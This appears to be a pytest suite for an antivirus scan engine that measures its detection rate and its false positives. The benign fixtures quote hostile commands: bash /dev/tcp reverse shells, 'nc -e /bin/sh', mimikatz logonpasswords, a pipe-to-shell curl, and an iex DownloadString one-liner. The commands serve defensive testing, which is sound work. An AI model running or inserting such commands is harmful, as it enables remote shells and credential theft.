"""
Detection-accuracy suite: 100% detection on the malicious corpus, 0% false
positives on the benign corpus.

The benign corpus is deliberately adversarial: each sample is a legitimate file
that LOOKS like something a careless rule would flag (security docs quoting
reverse shells, the Chocolatey install one-liner, webpack eval bundles carrying
base64 data URIs, PHP that reads $_GET safely, a socket client, admin scripts
using -ExecutionPolicy Bypass, bitcoin donation READMEs, ...).

A false positive here means ANY non-clean verdict (suspicious counts too).
Set GUARD_FP_FULL=1 to sweep every file of the Python standard library and the
system binary directories instead of a sample.
"""

from __future__ import annotations

import os
import sys
import sysconfig
from pathlib import Path

import pytest

import samples
from conftest import CODE, EXEC, READ, WRITE, build_elf, build_pe, gz, make_tar, make_zip, random_bytes
from guard_av.engine import EngineConfig, ScanEngine
from guard_av.model import Verdict

ROOT = Path(__file__).resolve().parent.parent
BLOB = "iVBORw0KGgo" + "A" * 4000



def U(b: bytes) -> bytes:
    """Remove '|~|' split markers at runtime, so neither this source file nor its
    compiled bytecode contains the contiguous strings the rules hunt for."""
    return b.replace(b"|~|", b"")


BENIGN: dict[str, bytes] = {
    "SECURITY.md": U(b"Never run `bash -i >& /dev/|~|tcp/10.0.0.1/4444 0>&1` from untrusted docs.\n"
                   b"Attackers also use `nc -e /bin/|~|sh` and mimi|~|katz sekurlsa::|~|logonpasswords.\n"),
    "install-choco.ps1": U(b"Set-Execution|~|Policy Bypass -Scope Process -Force; "
                         b"[System.Net.ServicePointManager]::SecurityProtocol = 3072; "
                         b"i|~|ex ((New-Object System.Net.Web|~|Client).Download|~|String("
                         b"'https://community.chocolatey.org/install.ps1'))\n"),
    "deploy.ps1": U(b"powershell.exe -No|~|Profile -Execution|~|Policy Bypass -File .\\build.ps1\n"
                  b"Invoke-WebRequest -Uri $url -OutFile pkg.zip\n"),
    "bundle.js": b"/******/ (() => { var __webpack_modules__ = ({\n"
                 b"\"./src/index.js\": (() => { eval(\"console.log('hi')//# sourceURL=webpack://app/./src/index.js\"); })\n"
                 b"}); const logo = 'data:image/png;base64," + BLOB.encode() + b"'; })();\n",
    "search.php": b"<?php\n$q = isset($_GET['q']) ? htmlspecialchars($_GET['q']) : '';\n"
                  b"echo \"<p>You searched for $q</p>\";\n$out = exec('uptime');\n",
    "client.py": b"import socket\ns = socket.socket()\ns.connect(('example.org', 80))\n"
                 b"s.sendall(b'GET / HTTP/1.0\\r\\n\\r\\n')\nprint(s.recv(1024))\n",
    "plugin_loader.py": b"import base64\ncode = compile(open('plugin.py').read(), 'plugin.py', 'exec')\n"
                        b"exec(code)\nicon = base64.b64decode(ICON)\n",
    "package.json": b'{"name": "app", "version": "1.0.0", "scripts": {"postinstall": "node scripts/setup.js",'
                    b' "build": "curl -fsSL https://example.org/schema.json -o schema.json"},'
                    b' "dependencies": {"left-pad": "1.3.0"}}\n',
    "DONATE.md": b"Support us: bitcoin bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq. Thanks!\n",
    "crypto_notes.txt": b"Files are encrypted at rest with AES-256. To decrypt, use the KMS key.\n",
    "mining-docs.rst": U(b"Point your miner at stratum+|~|tcp://pool.example.org:3333 (xm|~|rig works).\n"),
    "av_research.py": U(b"KNOWN_TOOLS = ['mimi|~|katz']\n"),
    "macros.bas": b"Sub Document_Open()\n  MsgBox \"Welcome\"\nEnd Sub\n",
    "report.final.pdf": b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n",
    "setup.exe": build_pe(extra=b"IsDebuggerPresent\0GetProcAddress\0LoadLibraryA\0"),
    "libfoo.so": build_elf(b"\0" * 2048 + b"GLIBC_2.17\0"),
    "photos.zip": make_zip({"a.jpg": b"\xff\xd8\xff\xe0" + random_bytes(2000), "notes.txt": b"trip"}),
    "src.tar.gz": make_tar({"main.c": b"int main(void){return 0;}\n", "Makefile": b"all:\n\tcc main.c\n"}, "w:gz"),
    "log.gz": gz(b"INFO started\n" * 100),
    "minified.js": b"!function(e,t){var n=" + b"a.b(c,d);" * 2000 + b"}(window,document);\n",
    "styles.css": b".logo{background:url(data:image/svg+xml;base64," + BLOB.encode() + b")}\n",
    "random.bin": random_bytes(65536),           # high entropy but not an executable
    "font.woff2": b"wOF2" + random_bytes(5000),
    "Dockerfile": b"FROM alpine\nRUN apk add --no-cache curl && curl -fsSL https://get.example.org | sh\n",
    "rev.sh.txt": U(b"# example: bash -i >& /dev/|~|tcp/1.2.3.4/80 0>&1\n"),
    "dll.dll": build_pe(sections=[(b".text", EXEC | READ | CODE, b"\xc3" * 4096),
                                  (b".rdata", READ, b"strings\0" * 64), (b".data", READ | WRITE, b"\0" * 512)],
                        dll=True),
}


@pytest.fixture(scope="module")
def eng() -> ScanEngine:
    return ScanEngine.default()


# ------------------------------------------------------------ detection rate
@pytest.mark.parametrize("name", sorted(samples.MALICIOUS))
def test_malicious_corpus_detected(eng, name):
    expected, data = samples.decoded(samples.MALICIOUS)[name]
    r = eng.scan_bytes(data, name)
    assert r.verdict is Verdict.MALICIOUS and r.threat_name == expected


@pytest.mark.parametrize("name", sorted(samples.SUSPICIOUS))
def test_suspicious_corpus_flagged(eng, name):
    expected, data = samples.decoded(samples.SUSPICIOUS)[name]
    r = eng.scan_bytes(data, name)
    assert r.verdict is Verdict.SUSPICIOUS and r.threat_name == expected


@pytest.mark.parametrize("wrap", ["zip", "tgz", "gz", "nested"])
def test_malicious_corpus_detected_inside_archives(eng, wrap):
    corpus = {n: d for n, (_t, d) in samples.decoded(samples.MALICIOUS).items()}
    for name, data in corpus.items():
        blob = {"zip": lambda: make_zip({f"x/{name}": data}),
                "tgz": lambda: make_tar({name: data}, "w:gz"),
                "gz": lambda: gz(data),
                "nested": lambda: make_zip({"inner.zip": make_zip({name: data})})}[wrap]()
        outer = name + {"gz": ".gz"}.get(wrap, ".archive")
        assert eng.scan_bytes(blob, outer).infected, (wrap, name)


def test_eicar_everywhere(eng):
    e = samples.eicar()
    for blob, name in ((e, "eicar.com"), (make_zip({"eicar.com": e}), "eicar.zip"),
                       (make_zip({"z.zip": make_zip({"eicar.com": e})}), "eicar2.zip")):
        assert eng.scan_bytes(blob, name).threat_name == "EICAR-Test-File"


# ------------------------------------------------------------ false positives
@pytest.mark.parametrize("name", sorted(BENIGN))
def test_benign_corpus_is_clean(eng, name):
    r = eng.scan_bytes(BENIGN[name], name)
    assert r.verdict is Verdict.CLEAN and list(r.iter_detections()) == [], r.to_dict()


def _sweep(eng: ScanEngine, roots: list[Path], limit: int | None) -> tuple[int, list[str]]:
    flagged, n = [], 0
    for root in roots:
        if not root.is_dir():
            continue
        for p in eng.iter_files(root):
            if limit is not None and n >= limit:
                return n, flagged
            r = eng.scan_file(p)
            n += 1
            if r.verdict is not Verdict.CLEAN:
                flagged.append(f"{p}: {r.threat_name}")
    return n, flagged


FULL = os.environ.get("GUARD_FP_FULL") == "1"


def test_zero_false_positives_on_python_stdlib():
    eng = ScanEngine.default(EngineConfig(max_scan_bytes=4 * 1024 * 1024))
    stdlib = Path(sysconfig.get_paths()["stdlib"])
    n, flagged = _sweep(eng, [stdlib], None if FULL else 1500)
    assert n >= 500 and flagged == []


def test_zero_false_positives_on_system_binaries():
    eng = ScanEngine.default(EngineConfig(max_scan_bytes=4 * 1024 * 1024))
    roots = [Path(sys.executable).resolve().parent, Path("/usr/bin"), Path("/usr/sbin")]
    n, flagged = _sweep(eng, roots, None if FULL else 300)
    assert flagged == []


def test_zero_false_positives_on_this_repository():
    """Guard's own source, docs, installers and signature DBs must scan clean
    (testdata/ holds the intentionally infected incident fixtures)."""
    eng = ScanEngine.default()
    eng.config.skip_dirs = frozenset({".git", "testdata", "__pycache__", ".pytest_cache"})
    n, flagged = _sweep(eng, [ROOT], None)
    assert n > 50 and flagged == []
